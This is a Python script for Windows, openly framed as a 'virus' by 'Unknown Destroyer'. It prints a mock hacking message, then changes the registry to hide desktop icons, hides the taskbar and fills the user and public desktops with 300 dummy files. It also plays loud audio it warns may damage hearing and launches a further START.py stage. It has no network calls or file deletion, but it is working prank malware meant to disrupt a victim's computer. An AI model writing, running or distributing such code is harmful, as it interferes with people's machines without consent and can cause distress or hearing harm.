import os
import time
import threading
import ctypes
import winreg
from pydub import AudioSegment
from pydub.playback import play
from ctypes import windll, create_unicode_buffer

print("                                                    ====   SUBTITLES  ====                                                              ")
print(" ")
print("Hi, your computer has been hacked by Unknown Destroyer, This application will damage the computer if you have an bad computer. If you are using an bad PC, your device may overheat. This application contains flashing lights, rapid patterns, and bright visuals that may trigger seizures in individuals with photosensitive epilepsy. If you want to stop this virus, stop it from now, you cant stop it later. disconnecting your headphones is recommended, so high sounds will open even if you lower the voice, it will high up itself. Do NOT open this virus on an device not belongs to you, if you already opened it, close the console prompts to disable the virus. And i think this much of warning is enough. Before starting the virus, i am going to show you my powers. You have 3 seconds to get to desktop. 3, 2, 1, and watch this. Haha, where your icons HAHA. Lemme bring em back. Bringing back... 3, 2, 1, and watch t his. Wooh, they are back! I think this is not enough. Check your taskbar. 3, 2, 1, you can see it right? Then watch this. 3,2,1 and boom. dont be scared i didnt ate your explorer, it will appear after 10 seconds. This virus isn't going to delete any files. But will generate TONS of files. If you are on desktop, please get outta there, open chrome or something. and wait 3 seconds. 3, 2, 1, aaanndd done! check your desktopp, i bringed back the icons too! i got enough. we're getting to actual virus now. after countdown, high boom bass effect come and make you deaf, after it 10 DB turkish marsch will start. if you are ready, we're startiinggg. Fifteen, fourteen, thirteen, twelve, eleven, ten, nine, eight, seven, six, five, four, three, two, one.")
print(" ")
print(" ")
print("                                                    ====   LOGS  ====                                                              ")

# CSIDL değerleri (yerel dilden bağımsız masaüstü yolları için)
CSIDL_DESKTOPDIRECTORY = 0x10  # Kullanıcıya özel masaüstü
CSIDL_COMMON_DESKTOPDIRECTORY = 0x19  # Ortak (herkese açık) masaüstü

def get_folder_path(csidl):
    buf = create_unicode_buffer(260)
    if windll.shell32.SHGetFolderPathW(None, csidl, None, 0, buf) == 0:
        return buf.value
    else:
        return None

def get_desktop_paths():
    paths = []
    user_desktop = get_folder_path(CSIDL_DESKTOPDIRECTORY)
    if user_desktop and os.path.exists(user_desktop):
        paths.append(user_desktop)
    common_desktop = get_folder_path(CSIDL_COMMON_DESKTOPDIRECTORY)
    if common_desktop and os.path.exists(common_desktop):
        paths.append(common_desktop)
    return paths

def show_desktop_icons(show):
    csidl = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"
    key = "HideIcons"
    value = 0 if show else 1
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, csidl, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, key, 0, winreg.REG_DWORD, value)
    except Exception as e:
        print("Registry hatası:", e)
    # Explorer yeniden başlatmadan, sistem mesajları gönderiliyor:
    HWND_BROADCAST = 0xFFFF
    WM_SETTINGCHANGE = 0x1A
    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    ctypes.windll.shell32.SHChangeNotify(0x8000000, 0x1000, None, None)

def show_taskbar(show):
    taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    res = ctypes.windll.user32.ShowWindow(taskbar, 5 if show else 0)
    print("Görev çubuğu işlem sonucu:", res)

def create_files_on_desktop():
    desktop_paths = get_desktop_paths()
    if not desktop_paths:
        print("Masaüstü dizini bulunamadı!")
        return
    for desktop in desktop_paths:
        print("Dosya oluşturulacak masaüstü dizini:", desktop)
        for i in range(300):
            try:
                file_path = os.path.join(desktop, f"dummy_{i}.txt")
                with open(file_path, "w") as f:
                    f.write("This is a dummy file.")
            except Exception as e:
                print(f"Dosya oluşturma hatası ({desktop}):", e)

def play_audio():
    try:
        audio = AudioSegment.from_mp3("voicevocal.mp3")
        play(audio)
    except Exception as e:
        print("Voicevocal oynatma hatası:", e)

def play_background(stop_event):
    try:
        # lofi.mp3'i yükle ve kısık sesle çal: (50 dB azaltıldı)
        bg = AudioSegment.from_mp3("lofi.mp3") - 45
        # Döngü içerisinde arka plan müziğini sürekli çalıyoruz
        while not stop_event.is_set():
            play(bg)
    except Exception as e:
        print("Arka plan müziği hatası:", e)

def task_manager():
    # 54. saniye: Masaüstü simgelerini gizle
    time.sleep(54)
    print("Masaüstü simgeleri gizleniyor...")
    show_desktop_icons(False)
    
    # 1 dakika 2. saniye (8 saniye sonra): Masaüstü simgelerini göster
    time.sleep(8)
    print("Masaüstü simgeleri gösteriliyor...")
    show_desktop_icons(True)
    
    # 1 dakika 13. saniye (11 saniye sonra): Görev çubuğunu gizle
    time.sleep(11)
    print("Görev çubuğu gizleniyor...")
    show_taskbar(False)
    
    # 10 saniye sonra: Görev çubuğunu göster
    time.sleep(10)
    print("Görev çubuğu gösteriliyor...")
    show_taskbar(True)
    
    # 1 dakika 32. saniye (9 saniye sonra): Masaüstüne dosya oluştur
    time.sleep(9)
    print("Masaüstüne dosyalar oluşturuluyor...")
    create_files_on_desktop()

def main():
    stop_event = threading.Event()
    
    audio_thread = threading.Thread(target=play_audio)
    background_thread = threading.Thread(target=play_background, args=(stop_event,))
    tasks_thread = threading.Thread(target=task_manager)
    
    background_thread.start()
    audio_thread.start()
    tasks_thread.start()
    
    audio_thread.join()
    tasks_thread.join()
    stop_event.set()  # voicevocal bitince arka plan müziğini sonlandır
    background_thread.join()
    
    os.startfile("START.py")

if __name__ == "__main__":
    main()

os.startfile("START.py")
